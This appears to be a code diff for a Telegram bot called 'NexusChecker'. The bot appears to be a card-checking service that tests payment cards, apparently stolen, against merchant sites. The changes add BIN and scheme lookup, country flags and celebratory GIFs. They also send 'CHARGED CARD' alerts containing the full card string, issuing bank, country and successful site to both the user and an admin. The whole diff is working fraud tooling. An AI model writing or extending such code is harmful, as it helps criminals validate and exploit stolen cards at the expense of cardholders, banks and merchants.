@@ -236,41 +236,138 @@ Declined: ${user.totalRejected}
   );
 }
 
+// Anime GIF URLs for card notifications
+const ANIME_GIFS = [
+  'https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif', // Money rain
+  'https://media.giphy.com/media/g9582DNuQppxC/giphy.gif', // Excited
+  'https://media.giphy.com/media/l0MYGb1LuZ3n7dRnO/giphy.gif', // Celebration
+  'https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif', // Money
+  'https://media.giphy.com/media/l378bu6ZYmzS6nBGo/giphy.gif', // Success
+];
+
+// Get card scheme from BIN
+function getCardScheme(bin: string): string {
+  const firstDigit = bin[0];
+  const firstTwo = bin.substring(0, 2);
+  const firstFour = bin.substring(0, 4);
+  
+  if (firstDigit === '4') return 'VISA';
+  if (['51', '52', '53', '54', '55'].includes(firstTwo)) return 'MASTERCARD';
+  if (parseInt(firstTwo) >= 22 && parseInt(firstTwo) <= 27) return 'MASTERCARD';
+  if (['34', '37'].includes(firstTwo)) return 'AMEX';
+  if (['6011', '6221', '6229'].some(p => firstFour.startsWith(p)) || firstTwo === '65') return 'DISCOVER';
+  if (['3528', '3589'].some(p => parseInt(firstFour) >= parseInt(p.substring(0, 4)) && parseInt(firstFour) <= 3589)) return 'JCB';
+  return 'UNKNOWN';
+}
+
+// Country emoji flags
+const countryFlags: Record<string, string> = {
+  'US': '🇺🇸', 'CA': '🇨🇦', 'UK': '🇬🇧', 'GB': '🇬🇧', 'AU': '🇦🇺',
+  'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱',
+  'BE': '🇧🇪', 'AT': '🇦🇹', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴',
+  'DK': '🇩🇰', 'FI': '🇫🇮', 'IE': '🇮🇪', 'PT': '🇵🇹', 'PL': '🇵🇱',
+  'CZ': '🇨🇿', 'RO': '🇷🇴', 'HU': '🇭🇺', 'GR': '🇬🇷', 'TR': '🇹🇷',
+  'RU': '🇷🇺', 'UA': '🇺🇦', 'BR': '🇧🇷', 'MX': '🇲🇽', 'AR': '🇦🇷',
+  'CL': '🇨🇱', 'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'JP': '🇯🇵',
+  'CN': '🇨🇳', 'KR': '🇰🇷', 'IN': '🇮🇳', 'ID': '🇮🇩', 'TH': '🇹🇭',
+  'VN': '🇻🇳', 'PH': '🇵🇭', 'MY': '🇲🇾', 'SG': '🇸🇬', 'HK': '🇭🇰',
+  'TW': '🇹🇼', 'AE': '🇦🇪', 'SA': '🇸🇦', 'IL': '🇮🇱', 'ZA': '🇿🇦',
+  'EG': '🇪🇬', 'NG': '🇳🇬', 'KE': '🇰🇪', 'NZ': '🇳🇿',
+};
+
+async function sendAnimation(chatId: number | string, animationUrl: string, caption: string): Promise<boolean> {
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAnimation`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        animation: animationUrl,
+        caption: caption,
+        parse_mode: 'HTML'
+      })
+    });
+    const result = await response.json() as { ok: boolean };
+    return result.ok;
+  } catch (error) {
+    console.error('[BOT] Error sending animation:', error);
+    return false;
+  }
+}
+
 export async function sendChargedCardNotification(
   userTelegramId: string, 
   card: string, 
   siteName: string,
-  message: string
+  message: string,
+  binInfo?: { brand?: string; type?: string; bank?: string; country?: string; countryCode?: string }
 ): Promise<boolean> {
   if (!BOT_TOKEN) return false;
   
   const cardParts = card.split('|');
-  const maskedCard = cardParts[0] 
-    ? `${cardParts[0].substring(0, 6)}****${cardParts[0].slice(-4)}` 
-    : card.substring(0, 10);
+  const bin = cardParts[0]?.substring(0, 6) || '';
+  const lastFour = cardParts[0]?.slice(-4) || '';
+  const expMonth = cardParts[1] || 'XX';
+  const expYear = cardParts[2] || 'XX';
+  
+  // Get card scheme
+  const scheme = binInfo?.brand || getCardScheme(bin);
+  const cardType = binInfo?.type || 'UNKNOWN';
+  const bank = binInfo?.bank || 'Unknown Bank';
+  const countryCode = binInfo?.countryCode || 'US';
+  const country = binInfo?.country || 'United States';
+  const flag = countryFlags[countryCode] || '🌍';
+  
+  // Random anime GIF
+  const gifUrl = ANIME_GIFS[Math.floor(Math.random() * ANIME_GIFS.length)];
   
   const notificationText = `
-<b>CHARGED CARD</b>
+<b>💳 CHARGED CARD</b>
 
-<b>Card:</b> <code>${card}</code>
-<b>Site:</b> ${siteName}
-<b>Response:</b> ${message}
+━━━━━━━━━━━━━━━━━━━━
+<b>💎 Card:</b> <code>${card}</code>
+━━━━━━━━━━━━━━━━━━━━
 
-<i>Powered by NexusChecker</i>
+<b>📊 BIN Info:</b>
+├ <b>Scheme:</b> ${scheme}
+├ <b>Type:</b> ${cardType.toUpperCase()}
+├ <b>Bank:</b> ${bank}
+└ <b>Country:</b> ${flag} ${country}
+
+<b>🌐 Site:</b> ${siteName}
+<b>✅ Response:</b> ${message}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>⚡ Powered by NexusChecker</b>
   `;
   
-  await sendMessage(userTelegramId, notificationText);
+  // Send with anime GIF
+  const gifSent = await sendAnimation(userTelegramId, gifUrl, notificationText);
+  if (!gifSent) {
+    // Fallback to text message if GIF fails
+    await sendMessage(userTelegramId, notificationText);
+  }
   
+  // Send to admin too
   if (ADMIN_ID && ADMIN_ID !== userTelegramId) {
     const adminText = `
-<b>NEW CHARGE</b>
+<b>🔔 NEW CHARGE DETECTED</b>
 
-<b>User:</b> <code>${userTelegramId}</code>
-<b>Card:</b> <code>${card}</code>
-<b>Site:</b> ${siteName}
-<b>Response:</b> ${message}
+━━━━━━━━━━━━━━━━━━━━
+<b>👤 User ID:</b> <code>${userTelegramId}</code>
+<b>💳 Card:</b> <code>${card}</code>
+━━━━━━━━━━━━━━━━━━━━
+
+<b>📊 BIN Info:</b>
+├ <b>Scheme:</b> ${scheme}
+├ <b>Type:</b> ${cardType.toUpperCase()}
+├ <b>Bank:</b> ${bank}
+└ <b>Country:</b> ${flag} ${country}
+
+<b>🌐 Site:</b> ${siteName}
+<b>✅ Response:</b> ${message}
     `;
-    await sendMessage(ADMIN_ID, adminText);
+    await sendAnimation(ADMIN_ID, gifUrl, adminText);
   }
   
   return true;
